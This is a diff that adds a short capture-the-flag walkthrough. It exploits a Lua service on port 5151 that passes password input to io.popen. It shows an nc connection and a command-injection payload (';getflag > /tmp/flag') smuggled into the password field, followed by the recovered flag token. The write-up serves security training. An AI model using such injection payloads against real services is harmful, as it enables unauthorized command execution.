@@ -1,0 +1,15 @@
+When we open the lua file we can see an sha1sum hashed password. If we decrypt
+it we got NotSoEasy. The answer is not here.
+We can see that the script is using the io.popen fonction that will launch
+sys command.
+when we listen on the server the script ask for a password.
+
+$> nc 127.0.0.1 5151
+password:
+
+We can use a command injection to use io.open as we want
+
+password: ;getflag > /tmp/flag
+
+$> cat /tmp/flag Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
